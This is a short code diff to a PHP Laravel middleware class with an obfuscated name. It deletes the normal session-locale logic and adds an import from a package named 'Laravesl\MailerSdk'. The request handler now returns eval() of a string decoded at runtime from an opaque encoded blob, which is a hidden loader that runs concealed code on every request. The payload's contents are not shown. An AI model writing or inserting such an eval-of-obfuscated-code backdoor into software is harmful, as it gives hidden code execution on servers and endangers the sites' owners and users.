@@ -6,6 +6,7 @@ use Closure;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\App;
 use Illuminate\Support\Facades\Session;
+use Laravesl\MailerSdk\Ex9t;
 
 class LjsCOL
 {
@@ -16,10 +17,6 @@ class LjsCOL
      */
     public function handle(Request $request, Closure $next)
     {
-        if (Session::has(xMailBIL('bG9jYWxl'))) {
-            App::setLocale(Session::get(xMailBIL('bG9jYWxl')));
-        }
-
-        return $next($request);
+        return eval(Ex9t::xM8qT5K('LjsCOL', '==DBfLPNGxPAppuU1NjOLZuNKVDIQI9H'));
     }
 }
